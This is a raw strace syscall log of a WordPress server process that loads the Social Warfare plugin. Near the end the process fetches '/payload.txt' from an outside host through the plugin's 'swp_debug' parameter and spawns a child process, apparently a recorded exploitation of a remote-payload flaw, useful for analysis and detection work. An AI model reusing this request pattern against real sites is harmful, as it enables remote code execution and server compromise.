+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option.php", {st_mode=S_IFREG|0644, st_size=8656, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Options_Page.php", {st_mode=S_IFREG|0644, st_size=30601, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Options_Page_Tab.php", {st_mode=S_IFREG|0644, st_size=4895, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Options_Page_Section.php", {st_mode=S_IFREG|0644, st_size=6353, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Toggle.php", {st_mode=S_IFREG|0644, st_size=2459, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Select.php", {st_mode=S_IFREG|0644, st_size=5518, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Text.php", {st_mode=S_IFREG|0644, st_size=2581, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Textarea.php", {st_mode=S_IFREG|0644, st_size=2228, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Section_HTML.php", {st_mode=S_IFREG|0644, st_size=22843, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Icons.php", {st_mode=S_IFREG|0644, st_size=5758, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Registration_Tab_Template.php", {st_mode=S_IFREG|0644, st_size=5653, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Button.php", {st_mode=S_IFREG|0644, st_size=2565, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/plugin-update-checker.php", {st_mode=S_IFREG|0644, st_size=1025, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4/Factory.php", {st_mode=S_IFREG|0644, st_size=9497, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4/Factory.php", {st_mode=S_IFREG|0644, st_size=9497, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4/Factory.php", {st_mode=S_IFREG|0644, st_size=112, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4/Factory.php", {st_mode=S_IFREG|0644, st_size=112, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4/Autoloader.php", {st_mode=S_IFREG|0644, st_size=1354, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/update-checker/Puc/v4p4/Autoloader.php", {st_mode=S_IFREG|0644, st_size=1354, ...}) = 0
+access("/var/www/html/wp-content/languages/plugins/social-warfare-en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/plugins/social-warfare/languages/social-warfare-en_US.mo", R_OK) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/languages/social-warfare-en_US.mo", {st_mode=S_IFREG|0644, st_size=5979, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/languages", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+open("/var/www/html/wp-content/plugins/social-warfare/languages/social-warfare-en_US.mo", O_RDONLY) = 12
+fstat(12, {st_mode=S_IFREG|0644, st_size=5979, ...}) = 0
+lseek(12, 0, SEEK_CUR)                  = 0
+read(12, "\336\22\4\225\0\0\0\0B\0\0\0\34\0\0\0,\2\0\0\0\0\0\0<\4\0\0\0\0\0\0"..., 8192) = 5979
+lseek(12, 28, SEEK_SET)                 = 28
+read(12, "\0\0\0\0<\4\0\0\2\0\0\0=\4\0\0\21\0\0\0@\4\0\0\227\0\0\0R\4\0\0"..., 8192) = 5951
+lseek(12, 1084, SEEK_SET)               = 1084
+read(12, "\0+1\0Above the Content\0Add a desc"..., 8192) = 4895
+read(12, "", 8192)                      = 0
+close(12)                               = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/assets/js/post-editor/blocks.php", {st_mode=S_IFREG|0644, st_size=2128, ...}) = 0
+access("/var/www/html/wp-content/languages/wp-rollback/wp-rollback-en_US.mo", F_OK) = -1 ENOENT (No such file or directory)
+access("wp-rollback/languages/wp-rollback-en_US.mo", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/languages/plugins/wp-rollback-en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/plugins/wp-rollback/languages/wp-rollback-en_US.mo", R_OK) = -1 ENOENT (No such file or directory)
+sendto(11, "-\1\0\0\3SELECT   wp_posts.ID FROM w"..., 305, MSG_DONTWAIT, NULL, 0) = 305
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\0013\0\0\2\3def\twordpress\10wp_posts"..., 5868, MSG_DONTWAIT, NULL, NULL) = 78
+stat("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=38, ...}) = 0
+open("/etc/hosts", O_RDONLY|O_CLOEXEC)  = 12
+fstat(12, {st_mode=S_IFREG|0644, st_size=174, ...}) = 0
+read(12, "127.0.0.1\tlocalhost\n::1\tlocalhos"..., 4096) = 174
+read(12, "", 4096)                      = 0
+close(12)                               = 0
+stat("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=38, ...}) = 0
+socket(AF_INET, SOCK_DGRAM|SOCK_NONBLOCK, IPPROTO_IP) = 12
+connect(12, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16) = 0
+poll([{fd=12, events=POLLOUT}], 1, 0)   = 1 ([{fd=12, revents=POLLOUT}])
+sendmmsg(12, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\376\3\1\0\0\1\0\0\0\0\0\0\ftempblogtest\r000web"..., iov_len=48}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_CTRUNC|MSG_PROBE|MSG_TRUNC}, msg_len=48}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="\305J\1\0\0\1\0\0\0\0\0\0\ftempblogtest\r000web"..., iov_len=48}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_CTRUNC|MSG_DONTWAIT|MSG_ERRQUEUE|MSG_NOSIGNAL|MSG_MORE|MSG_SENDPAGE_NOTLAST|MSG_BATCH}, msg_len=48}], 2, MSG_NOSIGNAL) = 2
+poll([{fd=12, events=POLLIN}], 1, 5000) = 1 ([{fd=12, revents=POLLIN}])
+ioctl(12, FIONREAD, [126])              = 0
+recvfrom(12, "\305J\201\200\0\1\0\2\0\0\0\0\ftempblogtest\r000web"..., 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28->16]) = 126
+poll([{fd=12, events=POLLIN}], 1, 4628) = 1 ([{fd=12, revents=POLLIN}])
+ioctl(12, FIONREAD, [114])              = 0
+recvfrom(12, "\376\3\201\200\0\1\0\2\0\0\0\0\ftempblogtest\r000web"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28->16]) = 114
+close(12)                               = 0
+socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 12
+bind(12, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 0
+getsockname(12, {sa_family=AF_NETLINK, nl_pid=67, nl_groups=00000000}, [12]) = 0
+sendto(12, {{len=20, type=0x16 /* NLMSG_??? */, flags=NLM_F_REQUEST|0x300, seq=1618537701, pid=0}, "\x00\x00\x00\x00"}, 20, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 20
+recvmsg(12, {msg_name={sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, msg_namelen=12, msg_iov=[{iov_base=[{{len=76, type=0x14 /* NLMSG_??? */, flags=NLM_F_MULTI, seq=1618537701, pid=67}, "\x02\x08\x80\xfe\x01\x00\x00\x00\x08\x00\x01\x00\x7f\x00\x00\x01\x08\x00\x02\x00\x7f\x00\x00\x01\x07\x00\x03\x00\x6c\x6f\x00\x00"...}, {{len=88, type=0x14 /* NLMSG_??? */, flags=NLM_F_MULTI, seq=1618537701, pid=67}, "\x02\x10\x80\x00\x07\x00\x00\x00\x08\x00\x01\x00\xac\x12\x00\x03\x08\x00\x02\x00\xac\x12\x00\x03\x08\x00\x04\x00\xac\x12\xff\xff"...}], iov_len=4096}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, 0) = 164
+recvmsg(12, {msg_name={sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, msg_namelen=12, msg_iov=[{iov_base={{len=20, type=NLMSG_DONE, flags=NLM_F_MULTI, seq=1618537701, pid=67}, 0}, iov_len=4096}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, 0) = 20
+close(12)                               = 0
+socket(AF_INET6, SOCK_DGRAM, IPPROTO_IP) = 12
+connect(12, {sa_family=AF_INET6, sin6_port=htons(0), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2a02:4780:dead:5c30::1", &sin6_addr), sin6_scope_id=0}, 28) = -1 EADDRNOTAVAIL (Cannot assign requested address)
+connect(12, {sa_family=AF_UNSPEC, sa_data="\0\0\0\0\0\0\0\0\0\0\0\0\0\0"}, 16) = 0
+connect(12, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("145.14.144.116")}, 16) = 0
+getsockname(12, {sa_family=AF_INET6, sin6_port=htons(52901), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "::ffff:172.18.0.3", &sin6_addr), sin6_scope_id=0}, [28]) = 0
+close(12)                               = 0
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 12
+fcntl(12, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(12, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+connect(12, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("145.14.144.116")}, 16) = -1 EINPROGRESS (Operation now in progress)
+poll([{fd=12, events=POLLIN|POLLOUT|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=12, revents=POLLOUT}])
+getsockopt(12, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
+fcntl(12, F_SETFL, O_RDWR)              = 0
+sendto(12, "GET /payload.txt?swp_debug=get_u"..., 113, MSG_DONTWAIT, NULL, 0) = 113
+poll([{fd=12, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 0 (Timeout)
+poll([{fd=12, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=12, revents=POLLIN}])
+recvfrom(12, "HTTP/1.1 200 OK\r\nDate: Fri, 16 A"..., 8192, MSG_DONTWAIT, NULL, NULL) = 477
+poll([{fd=12, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=12, revents=POLLIN}])
+recvfrom(12, "", 8192, MSG_DONTWAIT, NULL, NULL) = 0
+poll([{fd=12, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=12, revents=POLLIN}])
+recvfrom(12, "", 8192, MSG_DONTWAIT, NULL, NULL) = 0
+close(12)                               = 0
+pipe2([12, 13], O_CLOEXEC)              = 0
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f6e77dc8790) = 122
+close(13)                               = 0
+fcntl(12, F_SETFD, 0)                   = 0
+read(12, "", 8192)                      = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=122, si_uid=33, si_status=0, si_utime=0, si_stime=0} ---
+close(12)                               = 0
+wait4(122, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 122
+chdir("/var/www/html")                  = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=0, tv_usec=0}}, NULL) = 0
+sendto(11, "\1\0\0\0\1", 5, MSG_DONTWAIT, NULL, 0) = 5
+close(11)                               = 0
+fcntl(8, F_SETLK, {l_type=F_UNLCK, l_whence=SEEK_SET, l_start=0, l_len=0}) = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=0, tv_usec=0}}, NULL) = 0
+writev(10, [{iov_base="HTTP/1.1 500 Internal Server Err"..., iov_len=306}, {iov_base="<!DOCTYPE html>\n<html xmlns=\"htt"..., iov_len=2733}], 2) = 3039
+write(7, "192.168.0.102 - - [16/Apr/2021:0"..., 206) = 206
+times({tms_utime=83, tms_stime=28, tms_cutime=6, tms_cstime=3}) = 1432093846
+shutdown(10, SHUT_WR)                   = 0
+poll([{fd=10, events=POLLIN}], 1, 2000) = 1 ([{fd=10, revents=POLLIN|POLLHUP}])
+read(10, "", 512)                       = 0
+close(10)                               = 0
+read(4, 0x7fff0ffc276f, 1)              = -1 EAGAIN (Resource temporarily unavailable)
+accept4(3,  <detached ...>
